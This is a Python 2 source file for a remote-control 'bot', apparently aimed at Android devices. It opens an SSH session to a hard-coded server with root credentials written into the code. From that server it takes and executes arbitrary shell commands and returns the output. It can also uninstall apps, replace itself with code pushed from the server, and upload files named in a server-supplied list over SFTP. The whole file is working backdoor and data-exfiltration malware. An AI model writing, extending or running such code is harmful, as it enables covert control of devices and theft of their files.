from paramiko import Transport
from paramiko import SFTPClient
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from threading import  Thread
from  subprocess import Popen
from  subprocess import PIPE
from paramiko import RSAKey
import ChannelSSH
import os.path
import logging
logging.basicConfig()
duper_lp= "./path.cnf"
ip_server='192.168.43.99'
class Bot():
    def __init__(self):
        self.path_source = None
        self.path_destination = None
        self.chan = None
        self.tags = None

    def delete_apk(self,com_object):
        try:
            result = self.getOutputCmd("pm uninstall {}".format(com_object))
            return 0
        except:
            return 1

    def parse_apk_list(self):
        output = self.getOutputCmd("pm list packages -f -3").split('\n')
        return output

    def search_app(self,app_list, app_name):
        found = 0
        result = []

        for element in app_list:
            apk = element[8:].split('=')[0]
            com_object = element[8:].split('=')[1]

            if (app_name in apk) or (app_name in com_object):
                found = 1
                if self.delete_apk(com_object) == 0:
                    result.append(apk)

        if not found:
            ChannelSSH.sendToChannel("[-]App {} not found".format(app_name), self.chan)

        return result

    def rreplace(s, old, new, occurrence):
        li = s.rsplit(old, occurrence)
        return new.join(li)

    def update(self):
        file = ChannelSSH.receiveFromChannel(self.chan)
        self.getOutputCmd('rm bot.py')
        self.chan.close()
        open('bot.py', 'w+').write(file)
        self.getOutputCmd('chmod 777 bot.py')
        self.getOutputCmd('sleep 3 && python bot.py')

    def getOutputCmd(self,cmd):
        # do shell command
        try:
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            return stdout_value
        except:
            pass

    def sftp_authentication(self):
        try:
            transport = Transport((ip_server, 222))
            privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
            mykey = RSAKey.from_private_key_file(privatekeyfile)
            transport.connect(username='bot', pkey=mykey)
            sftp_client = SFTPClient.from_transport(transport)
            return  sftp_client, transport
        except Exception, e:
            print "SFTP Authentication Fail:"+str(e)

    def dump_db(self):
        try:
            fileserro=0
            msgerror=""
            sftp_client, transport = self.sftp_authentication()
            with open(duper_lp) as f:
                content = f.readlines()
            # to remove whitespace characters like `\n` at the end of each line
            for line in content:
                line=line.strip()
                if os.path.isfile(line):
                    sftp_client.put(line,self.path_destination+self.tags+'_'+os.path.basename(line))
                else:
                    msgerror+="-- le fichier "+str(line)+" n'existe pas !! \n"
            sftp_client.close()
            transport.close()
            ChannelSSH.sendToChannel(msgerror+"\n[*] End of dumping files \n", self.chan)
        except Exception, e:
            print "Fct:Dumper file export: " + str(e)
    def get_dumper_file(self):
        try:
            sftp_client, transport = self.sftp_authentication()
            # should verify if file duper_lp exist, create it else
            if not os.path.isfile(duper_lp):
                open(duper_lp, "w+").close()
            sftp_client.get(self.path_source, duper_lp, callback=None)
            sftp_client.close()
            transport.close()
        except Exception, e:
            print "Fct:Dumper file import: "+str(e)


    def connect(self):
        subRoot = None
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip_server,port=2222, username='root', password='thetoorpassword')
        self.chan = client.get_transport().open_session()
        while True:
            command = ChannelSSH.receiveFromChannel(self.chan)
            if 'deconnect' == command:
                ChannelSSH.closeChannel(self.chan)
                break
            elif 'dump' == command:
                Thread(target=self.dump_db).start()
            elif '**LOADPATH**' in command:
                inita, path_d,tags,path_s = command.split(';')
                self.path_source = path_s
                self.path_destination = path_d
                self.tags = tags
                self.get_dumper_file()
            elif 'delete' in command:
                try:
                    cmd, deleteapp = command.split(' ')
                    output = self.parse_apk_list()
                    result = self.search_app(output, deleteapp)
                    if len(result) >= 1:
                        ChannelSSH.sendToChannel("[+] App successfully deleted", self.chan)
                except:
                    ChannelSSH.sendToChannel('[-] Command syntax error', self.chan)
            elif 'update' in command:
                if not 'bot.py' in self.getOutputCmd('ls'):
                    ChannelSSH.sendToChannel('Your are not in the directory containing the code', self.chan)
                else:
                    ChannelSSH.sendToChannel('OK!', self.chan)
                    self.update()
                    break
            elif 'cd' in command:
                try:
                    code, directory = command.split(' ')
                    os.chdir(directory)
                    ChannelSSH.sendToChannel("[+] CWD Is " + os.getcwd(), self.chan)
                except:
                    ChannelSSH.sendToChannel("[-] Error, Double check the Dir", self.chan)
            else:
                ChannelSSH.sendToChannel(self.getOutputCmd(command),self.chan)


if __name__ == '__main__':
    bot = Bot()
    bot.connect()
    #teest update